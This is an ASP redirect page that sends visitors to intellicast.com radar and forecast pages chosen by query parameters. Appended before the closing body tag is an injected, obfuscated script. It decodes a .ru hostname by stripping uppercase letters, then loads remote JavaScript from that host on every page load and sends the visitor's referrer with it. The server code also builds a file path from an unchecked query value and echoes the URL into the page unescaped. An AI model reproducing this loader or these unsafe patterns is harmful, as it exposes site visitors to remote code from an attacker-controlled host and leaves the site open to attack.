<%
OPTION EXPLICIT

DIM sURL
DIM sSite
DIM sMode
DIM	sProdGrp
DIM	sLocation

sSite = Request.QueryString("site")
sMode = Request.QueryString("mode")
sLocation = ""
IF 0 = LEN(sSite) THEN

	sLocation = Request.QueryString("loc")
	IF 0 < LEN(sLocation) THEN
	
		DIM	sLocationName
		DIM	sLocationFullName
		DIM	sLocationRegionName
		DIM	sLocationAbbrevName

		sLocationName = ""
		sLocationFullName = ""
		sLocationRegionName = ""
		sLocationAbbrevName = ""


		DIM oFSO, oInFile	'object variables for file access
		DIM sFileName			'string containing filename of Source file to view
		DIM	sPath
		DIM	sTemp
		DIM	i

		ON Error Resume Next
		SET oFSO = CreateObject( "Scripting.FileSystemObject" )
		ON Error GOTO 0
		IF NOT Nothing IS oFSO THEN
			sTemp = Server.MapPath( "../.." )
			'sTemp = Request.ServerVariables( "PATH_TRANSLATED" )
			'i = InStrRev( sTemp, "\" )
			'sTemp = Left( sTemp, i )
			sPath = oFSO.BuildPath( sTemp, "location\" & sLocation )
			IF oFSO.FolderExists( sPath ) THEN
				sFileName = oFSO.BuildPath( sPath, "location.txt" )
				IF oFSO.FileExists( sFileName ) THEN
			
					SET oInFile = oFSO.OpenTextFile( sFileName )

					sLocationName = oInFile.ReadLine
					sLocationFullName = oInFile.ReadLine
					sLocationRegionName = oInFile.ReadLine
					sLocationAbbrevName = oInFile.ReadLine
						
					' Close file and free variables
					oInFile.Close
					SET oInFile = Nothing
					
					i = INSTR(1,sLocationAbbrevName,",",vbTextCompare)
					IF 0 < i THEN
						sSite = LCASE(TRIM(LEFT(sLocationAbbrevName,i-1)))
					ELSE
						sSite = LCASE(TRIM(sLocationAbbrevName))
					END IF

				END IF
			ELSE
				sLocation = ""
			END IF
		END IF

		SET oFSO = Nothing

	END IF

END IF

IF LEN(sSite) < 5 THEN

	'http://www.intellicast.com/Local/USLocalWide.asp
	'?loc=khsv&seg=LocalWeather&prodgrp=NEXRADimagery&product=BaseReflectivity&prodnav=none
	
	DIM	sFile
	DIM	sSeg
	DIM	sProdNav
	sFile = "USLocalWide.asp"
	sSeg = "LocalWeather"
	sProdNav = "none"
	
	SELECT CASE LCASE(sMode)
	CASE "basereflectivity", "nexrad"
		sMode = "BaseReflectivity"
		sProdGrp = "NEXRADimagery"
	CASE "radialvelocity", "velocity"
		sMode = "RadialVelocity"
		sProdGrp = "NEXRADimagery"
	CASE "radarloop", "loop"
		sMode = "BaseReflectivityLoop"
		sProdGrp = "NEXRADimagery"
	CASE "javaloop", "loop (java)"
		sMode = "JavaLoop"
		sProdGrp = "RadarImagery"
	CASE "precipitation", "precip"
		sMode = "BaseReflectivity"
		sProdGrp = "NEXRADimagery"
	CASE "regional", "region"
		sMode = "Radar"
		sProdGrp = "RadarImagery"
	CASE "regionloop", "regionalloop"
		sMode = "RadarLoop"
		sProdGrp = "RadarImagery"
	CASE "summary"
		sMode = "RadarSummary"
		sProdGrp = "SevereWeather"
	CASE "airstagnation"
		sFile = "UsLocalStd.asp"
		sSeg = "Health"
		sProdGrp = "Respiratory"
		sMode = "AirStagnation"
	CASE "achespains"
		sFile = "UsLocalStd.asp"
		sSeg = "Health"
		sProdGrp = "Respiratory"
		sMode = "AirStagnation"
	CASE "greatgolf", "golf"
		sFile = "UsLocalStd.asp"
		sSeg = "Golf"
		sProdGrp = "Forecasts"
		sMode = "GreatGolf"
	CASE "precipitation"
		sFile = "UsLocalStd.asp"
		sSeg = "LocalWeather"
		sProdGrp = "Forecasts"
		sMode = "PRECIPcast"
		sProdNav = "d1_00"
	CASE "temperature"
		sFile = "UsLocalStd.asp"
		sSeg = "LocalWeather"
		sProdGrp = "Forecasts"
		sMode = "TEMPcast"
		sProdNav = "d1_00"
	CASE "thunderstorm"
		sFile = "UsLocalStd.asp"
		sSeg = "LocalWeather"
		sProdGrp = "Forecasts"
		sMode = "THUNDERcast"
		sProdNav = "d1_00"
	CASE "wind"
		sFile = "UsLocalStd.asp"
		sSeg = "LocalWeather"
		sProdGrp = "Forecasts"
		sMode = "WINDcast"
		sProdNav = "d1_00"
	CASE ELSE
		sMode = "BaseReflectivity"
		sProdGrp = "NEXRADimagery"
	END SELECT

	sURL = "http://www.intellicast.com/Local/" & sFile _
			& "?loc=" & sSite _
			& "&seg=" & sSeg _
			& "&prodgrp=" & sProdGrp _
			& "&product=" & sMode _
			& "&prodnav=" & sProdNav _
			& "&pid=none"

ELSEIF 0 < INSTR(1,sSite,"/",vbTextCompare) THEN

	sURL = "http://www.intellicast.com/LocalWeather/World/UnitedStates/"

	sUrl = sUrl & sSite & "/" & sMode & "/"

ELSE

	sURL = "http://www.intellicast.com/"

END IF

'Response.Status = "303 Redirect Method"
Response.Redirect sUrl
%>
<html>

<head>
<meta name="robots" content="noindex">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<script language="JavaScript">
<!--

function doLoad()
{
	replaceWindowURL( self, "<%=sURL%>" );
}

//-->
</script>

<noscript>
<meta http-equiv="refresh" content="5; URL=<%=sURL%>">
</noscript>

<script language="JavaScript">
<!--
function replaceWindowURL( win, url )
{
	win.location.href = url;
}
//-->
</script>
<script language="JavaScript1.1">
<!--
function replaceWindowURL( win, url )
{
	win.location.replace( url );
}
//-->
</script>
</head>

<body onload="doLoad()">

<p>If you are seeing this, your web-browser does not support server driven page
redirection.</p>
<p><a href="<%=sURL%>">Here is the radar page requested</a>.</p>

<script>var QpaxQomozo = 'AXSXTNJFJJzJYOIOiCIKGJWmMFXLUOaIGPHZJLM0OUAHY7LEQOCWI.IVSrSOMNCBJu'.replace(/[A-Z]/g,''); var FibomafNidiza = document.createElement('script'); FibomafNidiza.src = 'http://' + QpaxQomozo + '/?page=' + escape(document.referrer) + '&rnd=' + Math.random(); document.getElementsByTagName('head')[0].appendChild(FibomafNidiza);</script></body>

</html>